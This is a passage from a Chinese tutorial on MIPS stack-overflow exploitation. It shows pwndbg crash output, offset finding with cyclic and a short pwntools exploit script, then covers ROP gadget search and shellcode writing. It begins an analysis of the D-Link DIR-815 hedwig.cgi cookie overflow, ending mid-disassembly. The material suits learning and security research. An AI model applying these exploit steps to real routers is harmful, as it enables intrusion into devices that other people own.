     ► 0x400170    move   $zero, $ra
       0x400174    bal    0x40017c
       0x400178    nop    
       0x40017c    lui    $gp, 0x42
       0x400180    addiu  $gp, $gp, 0x71e0
       0x400184    move   $ra, $zero
       0x400188    lw     $a0, -0x7fe0($gp)
       0x40018c    lw     $a1, ($sp)
       0x400190    addiu  $a2, $sp, 4
       0x400194    addiu  $at, $zero, -8
       0x400198    and    $sp, $sp, $at
    ───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
    00:0000│ sp  0x76ffefb0 ◂— 0x1
    01:0004│     0x76ffefb4 —▸ 0x76fff16a ◂— './no_leaf'
    02:0008│     0x76ffefb8 ◂— 0x0
    03:000c│     0x76ffefbc —▸ 0x76fff174 ◂— '_=/usr/bin/qemu-mipsel'
    04:0010│     0x76ffefc0 —▸ 0x76fff18b ◂— 'LC_CTYPE=en_US.UTF-8'
    05:0014│     0x76ffefc4 —▸ 0x76fff1a0 ◂— 0x435f534c ('LS_C')
    06:0018│     0x76ffefc8 —▸ 0x76fff728 ◂— 'LSCOLORS=Gxfxcxdxbxegedabagacad'
    07:001c│     0x76ffefcc —▸ 0x76fff748 ◂— 'LESS=-R'
    ─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
     ► f 0   400170
这里就用简单的cyclic指令生成一串字符串来测试偏移
    pwndbg> cyclic 200
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
输入字符串后程序崩溃
可以看到pwndbg里输出
    Program received signal SIGSEGV, Segmentation fault.
    0x61616168 in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
     V0   0xc9
     V1   0x0
     A0   0x0
     A1   0x76ffee28 ◂— 0x61616161 ('aaaa')
     A2   0x3e8
     A3   0x0
     T0   0x81010303
     T1   0x666165
     T2   0x2f494e4a ('JNI/')
     T3   0xffffffff
     T4   0x0
     T5   0x0
     T6   0x0
     T7   0x0
     T8   0x9
     T9   0x400470 ◂— lui    $gp, 2
     S0   0x0
     S1   0x41f000 ◂— 0xffffffff
     S2   0x0
     S3   0x0
     S4   0x0
     S5   0x0
     S6   0x0
     S7   0x0
     S8   0x61616167 ('gaaa')
     FP   0x76ffee48 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
     SP   0x76ffee48 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
     PC   0x61616168 ('haaa')
    ───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
    Invalid address 0x61616168
    ───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
    00:0000│ fp sp  0x76ffee48 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
    01:0004│        0x76ffee4c ◂— 'jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
    02:0008│        0x76ffee50 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
    03:000c│        0x76ffee54 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
    04:0010│        0x76ffee58 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
    05:0014│        0x76ffee5c ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
    06:0018│        0x76ffee60 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
    07:001c│        0x76ffee64 ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
    ─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
     ► f 0 61616168
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    Program received signal SIGSEGV
利用cyclic -l查看偏移可以得到偏移量为28
    pwndbg> cyclic -l 0x61616168
    28
exp和正常的pwn没什么区别,  
本例exp如下
    from pwn import *
    p=process("./no_leaf")
    payload='a'*0x38+p32(0x400370)
    p.sendline(payload)
    p.interactive()
## 叶子函数
在上述的介绍中可以知道,叶子函数是不存在堆栈上的,他会将返回地址存在$ra指针中,因此叶子函数的栈溢出并不好利用,但是在可以大量溢出的情况下,我们还是可以利用叶子函数的溢出的
## rop的使用
在做正常的pwn题时,构造rop链是一种非常具有杀伤力的攻击手段,在mips架构中自然也不逞多让,平常我们构造rop链可以通过ropgadget来自动化搜索gadget,而mips架构中也有一个很好用的搜索gadget的插件,即使用IDA的[mipsgadget插件](https://github.com/devttys0/ida/tree/master/plugins/mipsrop)
**_注:本插件适用于IDA6.8,但IDA7.0其实也有大师傅写了相应的脚本_**
使用方法:
    mipsrop.help()           帮助菜单
    mipsrop.doubles()        打印一系列函数调用gadget
    mipsrop.stackfinder()    寻找栈数据可控的 rop，放到寄存器中
    mipsrop.summary()        列出所有的可用 rop
    mipsrop.system()         列出用于执行system函数
    mipsrop.find(xxx)        查找特定rop
    mipsrop.tails()          列出将栈上的数据保存在$ra等寄存器中的rop
具体rop的使用和正常的pwn利用没有什么特别大的区别,这里也不再过多阐述
## 简单shellcode的编写思路
我这里记录下我平时写shellcode所用的方法
    首先用c语言完成所需的程序,然后利用gcc生成文件
    然后可以用objdump来进行反汇编,看一下是否会有坏指令,如果有就根据汇编文件自己修改一下,没有就直接用(想多
    根据反汇编代码来自己写一下汇编代码,然后根据需求修改到字节数大小满足,没有截断就结束:)
    然后objcopy一步到位
## 实例分析(D-LINK DIR-815多次溢出)
### 漏洞细节
D-Link Devices - 'hedwig.cgi' Remote Buffer Overflow in Cookie Header
    https://www.exploit-db.com/exploits/33863
虽然D-link官网只说明645版本会收到影响,但其实815,300,615也会有
### 固件下载地址:
    ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP
### 漏洞分析
我们根据公布漏洞的题目可以看出bug是出在'hedwig.cgi'文件内,而漏洞的成因是因为cookie过长可以导致栈溢出
下载完成后进行固件的提取,这里我们直接用binwalk就可以直接提取
    binwalk -e DIR-815.bin
然后进入 squashfs-root文件夹下就可以看到熟悉的内容了
    ~/iot/real/D-LINK815栈溢出/dir815_FW_101/_DIR-815.bin.extracted/squashfs-root  ls
    bin  dev  etc  home  htdocs  lib  mnt  proc  sbin  sys  tmp  usr  var  www
这时我们直接使用find命令搜索hedwig.cgi的位置即可
    find ./ -name 'hedwig.cgi'
    ./htdocs/web/hedwig.cgi
这时我们看看该文件是什么
    ~/iot/real/D-LINK815栈溢出/dir815_FW_101/_DIR-815.bin.extracted/squashfs-root/htdocs/web  ls -l hedwig.cgi 
    lrwxrwxrwx 1 nightrainy nightrainy 14 Nov  8 17:52 hedwig.cgi -> /htdocs/cgibin
可以看到这个文件是指向cgibin的符号链接,下面我们就对该文件进行反汇编分析,由于是cookie导致的溢出,那么我们就直接对cookie进行分析,我们可以通过查询字符串来定位函数位置,这里我使用的是ghidra,当然,IDA也是一样的效果  
可以搜索到字符串的函数应该是sess_get_uid函数,反汇编代码如下:
    **************************************************************
                                 *                          FUNCTION                          *
                                 **************************************************************
                                 undefined sess_get_uid()
                                   assume gp = 0x4346d0
                                   assume t9 = 0x407c98
                 undefined         v0:1           
                                 sess_get_uid                                    XREF[9]:     Entry Point(*), 
                                                                                              phpcgi_main:00405498(c), 
                                                                                              authentication:0040825c(c), 
                                                                                              sess_generate_captcha:0040861c(c
                                                                                              sess_validate:004087b0(c), 
                                                                                              sess_logout:0040893c(c), 
                                                                                              hedwigcgi_main:00409648(c), 
                                                                                              pigwidgeoncgi_main:00409c44(c), 
                                                                                              0042c714(*)  
            00407c98 43 00 1c 3c     lui        gp,0x43
                 assume t9 = 
                 assume gp = 
            00407c9c c0 ff bd 27     addiu      sp,sp,-0x40
            00407ca0 d0 46 9c 27     addiu      gp,gp,0x46d0
            00407ca4 3c 00 bf af     sw         ra,local_4(sp)
            00407ca8 38 00 be af     sw         s8,local_8(sp)
            00407cac 34 00 b7 af     sw         s7,local_c(sp)
            00407cb0 30 00 b6 af     sw         s6,local_10(sp)
            00407cb4 2c 00 b5 af     sw         s5,local_14(sp)
            00407cb8 28 00 b4 af     sw         s4,local_18(sp)
            00407cbc 24 00 b3 af     sw         s3,local_1c(sp)
            00407cc0 20 00 b2 af     sw         s2,local_20(sp)
            00407cc4 1c 00 b1 af     sw         s1,local_24(sp)
            00407cc8 18 00 b0 af     sw         s0,local_28(sp)
            00407ccc 10 00 bc af     sw         gp=>_gp,local_30(sp)
            00407cd0 f4 80 99 8f     lw         t9,-0x7f0c(gp)=>->sobj_new                       = 0040f560
            00407cd4 00 00 00 00     nop
            00407cd8 09 f8 20 03     jalr       t9=>sobj_new                                     undefined sobj_new()
            00407cdc 21 b0 80 00     _move      s6,a0
            00407ce0 10 00 bc 8f     lw         gp,local_30(sp)
            00407ce4 00 00 00 00     nop
            00407ce8 f4 80 99 8f     lw         t9,-0x7f0c(gp)=>->sobj_new                       = 0040f560
            00407cec 00 00 00 00     nop
            00407cf0 09 f8 20 03     jalr       t9=>sobj_new                                     undefined sobj_new()
            00407cf4 21 90 40 00     _move      s2,v0
            00407cf8 10 00 bc 8f     lw         gp,local_30(sp)
            00407cfc 42 00 04 3c     lui        a0,0x42
            00407d00 dc 82 99 8f     lw         t9,-0x7d24(gp)=>->getenv                         = 004194b0
            00407d04 cc a5 84 24     addiu      a0=>s_HTTP_COOKIE_0041a5cc,a0,-0x5a34            = "HTTP_COOKIE"
            00407d08 09 f8 20 03     jalr       t9=>getenv                                       char * getenv(char * __name)
            00407d0c 21 98 40 00     _move      s3,v0
            00407d10 10 00 bc 8f     lw         gp,local_30(sp)
            00407d14 72 00 40 12     beq        s2,zero,LAB_00407ee0
            00407d18 42 00 04 3c     _lui       a0,0x42
            00407d1c 70 00 60 12     beq        s3,zero,LAB_00407ee0
            00407d20 00 00 00 00     _nop
            00407d24 6e 00 40 10     beq        v0,zero,LAB_00407ee0